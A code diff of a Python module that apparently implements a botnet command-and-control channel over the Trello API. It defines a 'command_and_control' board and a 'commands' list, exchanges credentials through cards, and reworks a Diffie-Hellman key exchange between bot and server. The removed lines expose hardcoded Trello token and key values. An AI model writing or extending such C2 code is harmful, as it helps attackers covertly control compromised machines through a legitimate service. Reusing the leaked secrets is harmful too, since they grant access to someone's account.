@@ -11,17 +11,15 @@ from cryptography.hazmat.primitives.serialization import Encoding
 from cryptography.hazmat.primitives.serialization import load_pem_public_key
 import base64
 
-# maybe erase bootstrap
-BOOTSTRAP_TOKEN = '0371b95aaa9e16d0089fa4d55d078f5fab508c5af7e2d82a7c57aa6be908778b'
-BOOTSTRAP_KEY = '0e0a04d5f73b65a679a0b49f2f62df9a'
-BOOTSTRAP_BOARD_ID = '639637edc1f14f01dd74eff6'
+
+BOT_BOOTSTRAP_BOARD_ID = '639637edc1f14f01dd74eff6'
+SERVER_BOOTSTRAP_BOARD_ID = '63cec3e960da1500882c90ff'
 BOOTSTRAP_LIST_NAME_PREFIX = 'new_creds_'
 BOT_BOARD_NAME = 'command_and_control'
 BOT_LIST_NAME = 'commands'
 TRELLO_URL = 'https://api.trello.com/1/'
 SUCCESS = 200
-CRED_EXCH_SERVER_NAME = 'server public'
-CRED_EXCH_BOT_NAME = 'bot public'
+CRED_EXCH_NAME = 'public'
 CRED_ANS_CARD_NAME = 'new creds'
 CRED_REQ_CARD_NAME = 'request for new account'
 KEY_TOKEN_SEPERATOR = ':'
@@ -298,7 +296,7 @@ def get_DH_parameters():
     return parameters.parameters()
 
 
-def exchange_keys(key, token, list_id, is_server=False):
+def exchange_keys(key, token, write_list_id, read_list_id):
     # generate private and public key
     parameters = get_DH_parameters()
     private_key = parameters.generate_private_key()
@@ -306,24 +304,18 @@ def exchange_keys(key, token, list_id, is_server=False):
     public_key_bytes = public_key.public_bytes(
         encoding=Encoding.PEM, format=PublicFormat.SubjectPublicKeyInfo)
     other_public_key_bytes = None
-    if is_server:
-        my_card_name = CRED_EXCH_SERVER_NAME
-        other_card_name = CRED_EXCH_BOT_NAME
-    else:
-        my_card_name = CRED_EXCH_BOT_NAME
-        other_card_name = CRED_EXCH_SERVER_NAME
     # send public key to bootstrap
-    if create_card(key, token, list_id, my_card_name, public_key_bytes) < 0:
+    if create_card(key, token, write_list_id, CRED_EXCH_NAME, public_key_bytes) < 0:
         print("ERROR: could not post public key.")
 
     # wait for public key from bootstrap
     while True:
-        cards = get_cards_in_list(key, token, list_id)
+        cards = get_cards_in_list(key, token, read_list_id)
         if len(cards) == 0:
             print("ERROR: could not get cards in list")
             return None
         for card in cards:
-            if card['name'] == other_card_name:
+            if card['name'] == CRED_EXCH_NAME:
                 other_public_key_bytes = card['desc']
                 if not other_public_key_bytes:
                     print("ERROR: invalid public key received. looking for new...")
